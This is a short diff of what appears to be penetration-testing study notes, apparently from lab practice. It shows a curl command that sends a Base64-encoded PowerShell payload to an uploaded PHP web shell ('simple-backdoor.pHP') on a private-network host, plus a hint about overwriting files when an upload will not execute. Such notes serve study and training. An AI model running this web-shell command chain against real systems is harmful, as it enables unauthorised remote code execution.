@@ -56,7 +56,7 @@ $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
 $EncodedText =[Convert]::ToBase64String($Bytes)
 $EncodedText
 
-curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20$EncodedText
+curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20(replaced by $EncodedText)
 ```
 
 ### If can't execute uploaded file, try overwriting file
